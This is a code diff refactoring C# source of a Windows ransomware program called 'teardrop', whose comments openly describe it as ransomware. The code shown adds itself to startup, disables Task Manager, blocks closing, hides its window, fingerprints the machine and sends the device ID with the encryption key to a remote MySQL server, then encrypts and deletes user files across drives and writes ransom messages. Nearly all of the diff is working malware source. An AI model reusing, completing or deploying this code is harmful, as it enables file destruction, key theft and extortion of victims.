@@ -3,21 +3,17 @@ using Microsoft.Win32;
 using MySql.Data.MySqlClient;
 using System;
 using System.Collections.Generic;
-using System.ComponentModel;
 using System.Data;
-using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
-using System.Management;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace teardrop
 {
-    public partial class Form1 : Form
+    public partial class FrmMain : Form
     {
         bool debug = Properties.Settings.Default.debug;
 
@@ -31,7 +27,14 @@ namespace teardrop
             ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico", ".asp", 
             ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
         };
-        public Form1()
+
+        // So this is where a lot of magic is happening, and you dont wanna touch it unless spending 
+        // a lot of time in getting it to work again. Since it "kinda works" (like 80%), im not gonna
+        // try to fix this as long as a handful of people request it. It was already a pain and im happy
+        // it works for now.
+        string[] files;
+
+        public FrmMain()
         {
             InitializeComponent();
         }
@@ -78,13 +81,9 @@ namespace teardrop
         private void Setup()
         {
             GenerateKeys();
-
             GenerateRandomApplicationName();
-
             ChangeProcessMode();
-
             ChangeTaskManagerAccess();
-
             ChangeDesktopScreem();
         }
 
@@ -242,69 +241,45 @@ namespace teardrop
         // will be executed first. Well at list this is where the program pointer will be set to.
         private void Form1_Load(object sender, EventArgs e)
         {
+            string deviceId = string.Empty;
+
+            // Simple "Styling"
+            ShowInTaskbar = false;
+            Text = "";
+            ShowIcon = false;
+            // Will make the ransomware overlay other applications
+            //this.TopMost = true;    
+
             // Check if generated Strings are set like Application Name, Encryption Key, etc... are set
             Setup();
 
             // Register application to startup.
-            RegisterStartup(true);                                                                                                                  
-
-            // Simple "Styling"
-            this.ShowInTaskbar = false;
-            this.Text = "";
-            this.ShowIcon = false;
-
-            // Will make the ransomware overlay other applications
-            //this.TopMost = true;                                                                                                                  
-
+            RegisterStartup(true);
 
             timer1.Enabled = true;
             timer1.Start();
 
-            label1.Text = Properties.Settings.Default.application_title;
+            ChangePanelSettings();
 
-            // Center Visuals
-            label1.Location = new Point(panel_main.Width / 2 - label1.Width / 2, label1.Location.Y);
-            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
-
-            string deviceId = "";
-
-
-            try
-            {
-                // Generate Device ID for Database to identify encrypted machines
-                deviceId = new DeviceIdBuilder()
-                    .AddMachineName()
-                    .AddProcessorId()
-                    .AddMotherboardSerialNumber()
-                    .AddSystemDriveSerialNumber()
-                    .ToString();
-            }
-            catch(Exception DeviceIdError)
-            {
-                Log(DeviceIdError.Message, "Form1_Load > DeviceId");
-            }
-
-
-            // Connection String for MySQL Connection, if enabled.
-            string myConnectionString = "SERVER=" + Properties.Settings.Default.db_host + ";" +
-                            "DATABASE=" + Properties.Settings.Default.db_database + ";" +
-                            "UID=" + Properties.Settings.Default.db_user + ";" +
-                            "PASSWORD=" + Properties.Settings.Default.db_pass + ";";
-
-
+            deviceId = GetDeviceInfo();
 
             // the following code will register the victims machine on the mysql database server. 
             // this includes the generated deviceId and the encryption key.
-            if(Properties.Settings.Default.db_enable == true)
+            if (Properties.Settings.Default.db_enable == true)
             {
+                // Connection String for MySQL Connection, if enabled.
+                string myConnectionString = GetConnectionString();
+
                 try
                 {
                     MySqlConnection connection = new MySqlConnection(myConnectionString);
                     MySqlCommand command = connection.CreateCommand();
-                    command.CommandText = "INSERT INTO machine (deviceID,pass) VALUES ('" + deviceId + "', '" + Properties.Settings.Default.key + "')";
-                    MySqlDataReader Reader;
+                    
+                    command.CommandText = $@"INSERT INTO machine (deviceID,pass) VALUES ('{deviceId}', '{Properties.Settings.Default.key}')";
                     connection.Open();
-                    Reader = command.ExecuteReader();
+                    
+                    IDataReader Reader = command.ExecuteReader();
+
                     while (Reader.Read())
                     {
                         string row = "";
@@ -329,7 +304,42 @@ namespace teardrop
 
             // This will try to get as many files as possible.
             // Its not perferct and might fail sometimes on some drives etc..
-            Task.Run(() => GetFiles());
+            Task.Run(() => ChangeFiles());
+        }
+
+        private static string GetConnectionString()
+        {
+            return $@"SERVER={Properties.Settings.Default.db_host};
+                      DATABASE={Properties.Settings.Default.db_database};
+                      UID={Properties.Settings.Default.db_user}; 
+                      PASSWORD={Properties.Settings.Default.db_pass};";
+        }
+
+        private string GetDeviceInfo()
+        {
+            try
+            {
+                // Generate Device ID for Database to identify encrypted machines
+                return new DeviceIdBuilder()
+                    .AddMachineName()
+                    .AddProcessorId()
+                    .AddMotherboardSerialNumber()
+                    .AddSystemDriveSerialNumber()
+                    .ToString();
+            }
+            catch (Exception DeviceIdError)
+            {
+                Log(DeviceIdError.Message, "Form1_Load > DeviceId");
+                throw;
+            }
+        }
+
+        private void ChangePanelSettings()
+        {
+            label1.Text = Properties.Settings.Default.application_title;
+            // Center Visuals
+            label1.Location = new Point(panel_main.Width / 2 - label1.Width / 2, label1.Location.Y);
+            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
         }
 
         // Pretty obvious that this will disable the taskmanager if possible.
@@ -367,38 +377,37 @@ namespace teardrop
             textBox1.AppendText(text + Environment.NewLine);
         }
 
-        // So this is where a lot of magic is happening, and you dont wanna touch it unless spending 
-        // a lot of time in getting it to work again. Since it "kinda works" (like 80%), im not gonna
-        // try to fix this as long as a handful of people request it. It was already a pain and im happy
-        // it works for now.
-        string[] file;
         private void ShowAllFoldersUnder(string path, int indent, string mode = "decrypt")
         {
+            // "skipPath" is experimental and currently working
+            string[] skipPaths = new[]
+            {
+              "System32", "WinSxS", "Program Files"
+            };
+
             try
             {
-                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint)
-                    != FileAttributes.ReparsePoint)
+                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint)
                 {
-                    foreach (string folder in Directory.GetDirectories(path))
+                    IEnumerable<string> validDirectories = Directory.GetDirectories(path).Where(dir => !skipPaths.Contains(dir));
+
+                    foreach (string folder in validDirectories)
                     {
                         if (!folder.Contains("System Volume Information"))
                         {
                             try
                             {
-                                file = Directory.GetFiles(Path.GetFullPath(folder));
+                                files = Directory.GetFiles(Path.GetFullPath(folder));
                             }
-                            catch (Exception ex) { write(ex.Message); }
+                            catch (Exception ex)
+                            {
+                                write(ex.Message);
+                            }
 
                             // This should check the file extension.
-                            foreach (string filePath in file)
+                            foreach (string filePath in files)
                             {
                                 string extension = Path.GetExtension(filePath);
-
-                                // "skipPath" is experimental and currently not working
-                                var skipPath = new[]
-                                 {
-                                    "System32", "WinSxS", "Program Files"
-                                };
 
                                 // if the file has one of the extensions in validExtensions, it will try to encrypt it.
                                 if (validExtensions.Contains(extension.ToLower())) // ToLower() is used because a txt file can have the extension txt, TXT, tXT and it would still work.
@@ -422,29 +431,29 @@ namespace teardrop
                                     }
                                     catch (Exception ex2)
                                     {
-                                        write("Cant delete file " + ex2.Message);
+                                        write($"Cant delete file {ex2.Message}");
                                         Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
                                     }
                                 }
-
                             }
                         }
-
                         ShowAllFoldersUnder(folder, indent + 2);
                     }
                 }
             }
-            catch (Exception e) { write(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error"); }
-            
+            catch (Exception e)
+            {
+                write(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error");
+            }
         }
 
         // This will get all the files  and and tries to encrypt it. It works together with "ShowAllFoldersUnder()"
         // to get as many files as possible.
-        public void GetFiles(string mode = "encrypt")
+        public void ChangeFiles(string mode = "encrypt")
         {
             try
             {
-                ChangeFiles(mode);
+                ManageFiles(mode);
                 WriteMessagesOnDrivers();
             }
             catch (Exception ex)
@@ -508,7 +517,7 @@ namespace teardrop
             }
         }
 
-        private void ChangeFiles(string mode)
+        private void ManageFiles(string mode)
         {
             // Encrypt Desktop Files first!
             string deskTopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
@@ -604,18 +613,18 @@ namespace teardrop
         }
 
         // This should prevent the application from closing. Just a simple measurement but not 100% safe to use only.
-        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
             e.Cancel = true;
         }
 
         // Here we try to decrypt the files
-        private void button1_Click(object sender, EventArgs e)
+        private void Button1_Click(object sender, EventArgs e)
         {
             // Small check if a key is actually set
-            if(textBox3.Text.Length >= 0 && string.IsNullOrEmpty(textBox3.Text) == false)
+            if(!string.IsNullOrEmpty(textBoxKey.Text.Trim()))
             {
-                GetFiles("decrypt");
+                ChangeFiles("decrypt");
             }
         }
     }
